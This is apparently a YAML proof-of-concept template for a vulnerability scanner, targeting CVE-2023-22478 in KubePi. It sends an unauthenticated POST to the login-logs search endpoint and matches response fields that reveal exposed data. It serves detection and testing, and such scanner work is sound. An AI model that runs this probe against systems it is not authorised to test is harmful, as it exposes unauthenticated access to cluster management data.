name: yaml-poc-fit2cloud-kubepi-other-CVE-2023-22478
binding: 67b88f57-88b0-454a-83a3-cd1a6f345f8a
detail:
    author: jiapeng.han
    links:
        - https://github.com/KubeOperator/KubePi/commit/0c6774bf5d9003ae4d60257a3f207c131ff4a6d6
        - https://github.com/KubeOperator/KubePi/releases/tag/v1.6.4
        - https://github.com/KubeOperator/KubePi/security/advisories/GHSA-gqx8-hxmv-c4v4
    vulnerability:
        id: eb904d63-ab62-466a-bb9f-020e4d5b5593
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /kubepi/api/v1/systems/login/logs/search?pageNum=1&&pageSize=10
            headers:
                Content-Type: application/json
            body: |
                {}
        expression: response.status == 200 && response.content_type.contains("application/json") && response.body_string.contains('"apiVersion":') && response.body_string.contains('"builtIn":')
expression: r0()
